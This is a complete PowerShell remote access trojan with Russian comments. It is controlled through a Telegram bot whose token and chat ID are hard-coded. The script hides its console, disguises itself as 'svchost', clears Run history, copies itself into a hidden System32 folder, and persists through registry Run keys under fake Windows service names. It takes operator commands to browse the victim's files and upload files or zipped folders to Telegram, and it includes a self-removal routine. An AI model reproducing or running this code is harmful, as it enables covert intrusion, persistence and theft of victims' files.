# RAT через Telegram Bot - ИСПРАВЛЕННАЯ ВЕРСИЯ БЕЗ ДИАЛОГОВ
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# Установка кодировки UTF-8 для корректного отображения русских символов
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

# Настройки скрытности
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# Скрытие окна PowerShell через изменение заголовка окна
$windowCode = @"
using System;
using System.Runtime.InteropServices;
public class WindowHider {
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern int SetWindowText(IntPtr hWnd, string text);
}
"@
Add-Type -TypeDefinition $windowCode
$consolePtr = [WindowHider]::GetConsoleWindow()
[WindowHider]::ShowWindow($consolePtr, 0) | Out-Null
[WindowHider]::SetWindowText($consolePtr, "svchost") | Out-Null

# Изменение имени процесса для диспетчера задач
try {
    $process = Get-Process -Id $pid
    $process.ProcessName = "svchost"
} catch { }

# Очистка истории RUN при запуске
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
} catch { }

# Функция отправки сообщений с правильной кодировкой
function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
    }
    
    try {
        $jsonBody = $body | ConvertTo-Json
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json; charset=utf-8" -UseBasicParsing
    } catch { 
        try {
            # Альтернативный метод с формой
            $form = @{
                chat_id = $ChatID
                text = $Message
            }
            $response = Invoke-RestMethod -Uri $url -Method Post -Body $form -UseBasicParsing
        } catch { }
    }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        Send-TelegramFile -FilePath $FilePath
    }
}

# Функция отправки файлов - ПОЛНОСТЬЮ ПЕРЕПИСАНА
function Send-TelegramFile {
    param([string]$FilePath)
    
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    
    try {
        # Используем WebClient для избежания диалогов
        $webClient = New-Object System.Net.WebClient
        
        # Создаем временный файл с уникальным именем
        $tempDir = "$env:TEMP\TelegramUpload_$(Get-Random)"
        New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
        attrib +s +h "$tempDir" 2>&1 | Out-Null
        
        $originalName = Split-Path $FilePath -Leaf
        $tempFilePath = Join-Path $tempDir $originalName
        
        # Копируем файл с принудительной перезаписью
        Copy-Item $FilePath $tempFilePath -Force
        
        # Формируем multipart запрос вручную
        $boundary = [System.Guid]::NewGuid().ToString()
        $fileBytes = [System.IO.File]::ReadAllBytes($tempFilePath)
        $encoding = [System.Text.Encoding]::GetEncoding("iso-8859-1")
        
        # Формируем тело запроса
        $bodyBuilder = New-Object System.Text.StringBuilder
        
        # Добавляем chat_id
        $bodyBuilder.AppendLine("--$boundary") | Out-Null
        $bodyBuilder.AppendLine('Content-Disposition: form-data; name="chat_id"') | Out-Null
        $bodyBuilder.AppendLine() | Out-Null
        $bodyBuilder.AppendLine($ChatID) | Out-Null
        
        # Добавляем файл
        $bodyBuilder.AppendLine("--$boundary") | Out-Null
        $bodyBuilder.AppendLine("Content-Disposition: form-data; name=`"document`"; filename=`"$originalName`"") | Out-Null
        $bodyBuilder.AppendLine("Content-Type: application/octet-stream") | Out-Null
        $bodyBuilder.AppendLine() | Out-Null
        
        $bodyBytes = $encoding.GetBytes($bodyBuilder.ToString())
        
        # Создаем конечный массив байтов
        $endLine = $encoding.GetBytes("`r`n--$boundary--`r`n")
        $finalBytes = $bodyBytes + $fileBytes + $endLine
        
        # Отправляем запрос
        $webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
        $response = $webClient.UploadData($url, "POST", $finalBytes)
        
        # Очищаем временные файлы
        Remove-Item $tempFilePath -Force -ErrorAction SilentlyContinue
        Remove-Item $tempDir -Force -ErrorAction SilentlyContinue
        $webClient.Dispose()
        
        return $true
        
    } catch {
        try {
            # Резервный метод - используем Invoke-RestMethod с MemoryStream
            $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
            $fileStream = New-Object System.IO.MemoryStream(,$fileContent)
            
            $form = @{
                chat_id = $ChatID
                document = $fileStream
            }
            Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
            $fileStream.Close()
            $fileStream.Dispose()
            return $true
        } catch {
            return $false
        }
    }
}

# Функция создания ZIP архива
function Compress-Folder {
    param([string]$FolderPath, [string]$ZipPath)
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch {
        try {
            # Резервный метод архивации через COM
            $shell = New-Object -ComObject Shell.Application
            $zipFolder = $shell.NameSpace($ZipPath)
            $sourceFolder = $shell.NameSpace($FolderPath)
            $zipFolder.CopyHere($sourceFolder.Items())
            Start-Sleep -Seconds 3
            return $true
        } catch {
            return $false
        }
    }
}

# Функция очистки RAT (интегрированный cleanup.ps1)
function Invoke-Cleanup {
    # Отправляем начало очистки
    Send-Telegram "🔍 Начинается полная очистка RAT..."

    # 1. Завершаем все процессы RAT
    Send-Telegram "🔄 Этап 1: Завершение процессов RAT"

    $processes = Get-Process | Where-Object {
        $_.ProcessName -eq "powershell" -or 
        $_.ProcessName -eq "pwsh" -or
        $_.ProcessName -eq "cmd"
    }

    foreach ($process in $processes) {
        try {
            $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($process.Id)").CommandLine
            if ($cmdLine -like "*WindowsSystem*" -or $cmdLine -like "*svchost.exe*" -or $cmdLine -like "*Windows Defender Security*" -or $cmdLine -like "*spoolsv.exe*" -or $cmdLine -like "*System32Logs*" -or $cmdLine -like "*8429674512*") {
                Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
            }
        } catch { }
    }

    # 2. Удаляем файлы RAT
    Send-Telegram "🔄 Этап 2: Удаление файлов RAT"

    $filesToDelete = @(
        "$env:WINDIR\System32\Microsoft.NET\Framework64\v4.0.30319\Config\svchost.exe",
        "$env:TEMP\WindowsSystem.exe",
        "$env:TEMP\cleanup_*.ps1",
        "$env:WINDIR\System32\drivers\etc\hosts_backup\spoolsv.exe",
        "$env:TEMP\rat_installed.marker",
        "$env:WINDIR\System32\System32Logs\svchost.exe",
        "$env:PROGRAMDATA\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted\windows_update.marker",
        "$env:TEMP\TelegramUpload_*"
    )

    $deletedFiles = @()
    foreach ($filePattern in $filesToDelete) {
        try {
            Get-ChildItem -Path $filePattern -ErrorAction SilentlyContinue | ForEach-Object {
                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue -Recurse
                $deletedFiles += $_.FullName
            }
        } catch { }
    }

    # 3. Очищаем автозагрузку реестра
    Send-Telegram "🔄 Этап 3: Очистка реестра"

    $regPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce", 
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
    )

    $regEntries = @()
    foreach ($regPath in $regPaths) {
        try {
            $value1 = Get-ItemProperty -Path $regPath -Name "Windows Defender Security" -ErrorAction SilentlyContinue
            if ($value1) {
                Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
                $regEntries += "$regPath\Windows Defender Security"
            }
            
            $value2 = Get-ItemProperty -Path $regPath -Name "Windows Audio Service" -ErrorAction SilentlyContinue
            if ($value2) {
                Remove-ItemProperty -Path $regPath -Name "Windows Audio Service" -Force -ErrorAction SilentlyContinue
                $regEntries += "$regPath\Windows Audio Service"
            }
            
            $value3 = Get-ItemProperty -Path $regPath -Name "System32 Logs Service" -ErrorAction SilentlyContinue
            if ($value3) {
                Remove-ItemProperty -Path $regPath -Name "System32 Logs Service" -Force -ErrorAction SilentlyContinue
                $regEntries += "$regPath\System32 Logs Service"
            }
        } catch { }
    }

    # 4. Очищаем историю RUN
    Send-Telegram "🔄 Этап 4: Очистка истории RUN"
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue

    # 5. Финальный отчет
    $report = @"
✅ ОЧИСТКА RAT ЗАВЕРШЕНА

Удаленные файлы:
$($deletedFiles -join "`n")

Удаленные записи реестра:
$($regEntries -join "`n")

Все следы RAT успешно удалены.
"@

    Send-Telegram $report
    return $true
}

# Установка в автозагрузку с улучшенной маскировкой
$installMarkerDir = "$env:PROGRAMDATA\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted"
if (!(Test-Path $installMarkerDir)) {
    New-Item -Path $installMarkerDir -ItemType Directory -Force | Out-Null
    attrib +s +h +r "$installMarkerDir" 2>&1 | Out-Null
}
$installMarker = "$installMarkerDir\windows_update.marker"

# Проверяем, не установлен ли уже RAT
if (!(Test-Path $installMarker)) {
    # Создаем маркер установки с безобидным именем
    "Windows Update Helper - $(Get-Date)" | Out-File -FilePath $installMarker -Encoding UTF8
    attrib +s +h +r "$installMarker" 2>&1 | Out-Null
    
    # Новая скрытая папка в системной директории
    $hiddenFolder = "$env:WINDIR\System32\System32Logs"
    if (!(Test-Path $hiddenFolder)) { 
        New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
        # Скрываем папку системными атрибутами
        attrib +s +h +r "$hiddenFolder" 2>&1 | Out-Null
    }
    
    $scriptPath = "$hiddenFolder\svchost.exe"
    
    # Копируем скрипт только если его там нет
    if (!(Test-Path $scriptPath)) {
        $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
        $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
        # Устанавливаем скрытые атрибуты на файл
        attrib +s +h +r "$scriptPath" 2>&1 | Out-Null
    }
    
    # Установка в автозагрузку с новым маскированным именем
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
    
    # Новое маскированное имя для реестра
    $uniqueName = "System32 Logs Service"
    Set-ItemProperty -Path $regPath -Name $uniqueName -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
    
    # Дополнительная установка в другую ветку реестра для надежности
    $regPath2 = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    try {
        if (!(Test-Path $regPath2)) { New-Item -Path $regPath2 -Force | Out-Null }
        Set-ItemProperty -Path $regPath2 -Name "Windows System Logs" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# Основные переменные
$currentDir = "C:\"
$global:LastSentMessage = ""
$global:LastUpdateId = 0

# Очистка истории сообщений при запуске
try {
    $clearUrl = "https://api.telegram.org/bot$Token/getUpdates?offset=-1"
    Invoke-RestMethod -Uri $clearUrl -Method Get -UseBasicParsing | Out-Null
} catch { }

# Отправка информации о запуске
Send-Telegram "RAT активирован на $env:COMPUTERNAME
Доступные команды:
/help - список команд
/ls - список файлов
/cd [папка] - сменить директорию
/download [файл] - скачать файл
/destroy - самоуничтожение"

# Основной цикл опроса
while ($true) {
    try {
        $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
        
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $global:LastUpdateId = $update.update_id
                
                if ($update.message.chat.id -eq $ChatID) {
                    $command = $update.message.text
                    
                    # Обработка команд
                    switch -regex ($command) {
                        "^/help$" {
                            Send-Telegram "Доступные команды:
/help - показать это сообщение
/ls - список файлов в текущей директории
/cd [папка] - сменить директорию
/download [файл] - скачать файл или папку
/destroy - самоуничтожение RAT"
                        }
                        "^/ls$" {
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "Содержимое $currentDir
$($fileList -join "`n")"
                        }
                        "^/cd (.+)$" {
                            $newDir = $matches[1].Trim()
                            if ($newDir -eq "..") {
                                $currentDir = Split-Path $currentDir -Parent
                                if (!$currentDir) { $currentDir = "C:\" }
                            } else {
                                $testPath = Join-Path $currentDir $newDir
                                if (Test-Path $testPath -PathType Container) {
                                    $currentDir = $testPath
                                } else {
                                    Send-Telegram "Директория не найдена: $newDir"
                                    continue
                                }
                            }
                            
                            # Отправляем содержимое новой директории с помощью /ls
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "/ls $currentDir
$($fileList -join "`n")"
                        }
                        "^/download (.+)$" {
                            $target = $matches[1].Trim()
                            $fullPath = Join-Path $currentDir $target
                            
                            if (Test-Path $fullPath) {
                                Send-Telegram "⏳ Начинаю отправку файла: $target"
                                
                                if (Test-Path $fullPath -PathType Container) {
                                    # Архивируем папку
                                    $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                    if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                        $result = Send-TelegramFile -FilePath $zipPath
                                        if ($result) {
                                            Send-Telegram "✅ Папка $target успешно отправлена"
                                        } else {
                                            Send-Telegram "❌ Ошибка отправки папки: $target"
                                        }
                                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                    } else {
                                        Send-Telegram "❌ Ошибка архивации папки: $target"
                                    }
                                } else {
                                    $result = Send-TelegramFile -FilePath $fullPath
                                    if ($result) {
                                        Send-Telegram "✅ Файл $target успешно отправлен"
                                    } else {
                                        Send-Telegram "❌ Ошибка отправки файла: $target"
                                    }
                                }
                            } else {
                                Send-Telegram "❌ Файл/папка не найдены: $target"
                            }
                        }
                        "^/destroy$" {
                            Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
                            
                            try {
                                # Запускаем встроенную функцию очистки
                                $cleanupResult = Invoke-Cleanup
                                
                                if ($cleanupResult) {
                                    # Даем время на отправку финального сообщения
                                    Start-Sleep -Seconds 3
                                    
                                    # Завершаем текущий процесс
                                    Stop-Process -Id $pid -Force
                                }
                                
                            } catch {
                                Send-Telegram "❌ Ошибка при самоуничтожении: $($_.Exception.Message)"
                                
                                # Аварийная очистка
                                try {
                                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                    Stop-Process -Id $pid -Force
                                } catch {
                                    cmd /c "taskkill /f /pid $pid" 2>&1 | Out-Null
                                }
                            }
                        }
                    }
                }
            }
        }
    } catch { 
        Start-Sleep -Seconds 5
    }
}
